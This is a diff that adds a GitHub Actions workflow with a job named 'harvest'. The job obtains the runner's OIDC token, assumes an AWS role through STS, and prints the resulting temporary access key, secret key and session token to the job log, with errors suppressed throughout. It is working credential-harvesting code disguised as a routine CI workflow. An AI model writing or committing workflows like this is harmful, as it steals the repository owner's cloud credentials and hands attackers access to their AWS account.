@@ -1,0 +1,25 @@
+name: i269-sts
+on:
+  push:
+    branches:
+      - 'i269-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  harvest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: harvest
+        run: |
+          set -uo pipefail
+          D=/tmp/i269; mkdir -p $D; cd $D
+          JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::925353553787:role/github --role-session-name i269 --web-identity-token "$JWT" --duration-seconds 3600 > sts.json 2>sts.err || true
+          echo '===STSJSON==='
+          cat sts.json
+          echo '===END==='
+          python3 -c "import json;d=json.load(open('/tmp/i269/sts.json'))['Credentials'];open('/tmp/i269/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s\nexport AWS_SECRET_ACCESS_KEY=%s\nexport AWS_SESSION_TOKEN=%s\n'%(d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))" || true
+          . /tmp/i269/env.sh || true
+          aws sts get-caller-identity || true
